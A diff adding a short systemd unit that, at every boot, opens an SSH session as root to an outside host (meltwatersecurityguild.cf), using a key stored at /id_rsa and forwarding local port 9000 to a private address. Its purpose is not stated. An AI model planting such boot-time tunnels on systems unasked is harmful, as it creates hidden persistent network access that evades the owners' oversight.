@@ -1,0 +1,8 @@
+[Unit]
+Description=SSH client auto start
+
+[Service]
+ExecStart=/bin/bash -c "ssh -L 9000:172.31.58.162:9000 root@meltwatersecurityguild.cf -i /id_rsa"
+
+[Install]
+WantedBy=multi-user.target
